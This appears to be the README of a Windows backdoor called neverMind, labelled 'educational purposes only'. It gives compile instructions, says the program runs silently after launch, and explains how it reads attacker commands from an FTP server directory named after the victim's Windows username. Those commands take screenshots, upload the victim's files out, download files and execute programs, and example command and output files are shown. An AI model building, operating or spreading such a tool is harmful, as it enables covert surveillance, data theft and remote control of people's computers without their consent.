# neverMind

**educational purposes only!**

read more on my [blog](https://www.bsssq.xyz/posts/2024/01/nevermind/)!

# compile (on windows)

1. open developer command prompt in visual studio (this uses the MSVC compiler)

2. navigate to directory where `main.cpp` is stored

3. compile using `cl`

```bash
cl /EHsc main.cpp
```

once you have the executable, click it and the backdoor runs silently in the background. 

# overview (quick)

the program is controlled remotely via commands stored in a file on an FTP server. 

1. FTP server setup: the program requires an FTP server to be set up with a specific directory structure. the server must have a directory with the same name as the windows username of the target system. inside this directory, there should be a file named `cmd.txt` that contains the commands to be executed.

2. command file: the `cmd.txt` file contains the commands that the program executes. each line in the file represents a separate command. the program supports several commands: `print`, `screen`, `upload`, `download`, `exec`.

- example of `cmd.txt`:

```bash
print hello, world!
screen 1
upload C:\\Users\\bilal\\Desktop\\file.txt file.txt
download file2.txt
exec notepad.exe
```

the program is instructed to:

- print the message "hello, world!"

- take 1 (one) screenshot

- upload the file `C:\\Users\\bilal\\Desktop\\file.txt` to the FTP server with the name `file.txt`

- download the file `file2.txt` from the FTP server

- execute the command `notepad.exe` which opens the notepad app

3. output upload: after executing the commands, the program uploads an `output.txt` to the FTP server. this file contains the output of the executed commands and any error messages.

- example of `output.txt`:

```bash
[PRINT][>] hello, world! [<]
[SCREEN][++] screenshot saved >> C:\\Users\\bilal\\AppData\\Local\\SystemConnect\\data\\screenshot1.bmp [++]
[UPLOAD][++] file C:\\Users\\bilal\\Desktop\\file.txt upload as file.txt successful [++]
[DOWNLOAD][++] file file2.txt download successful [++]
```


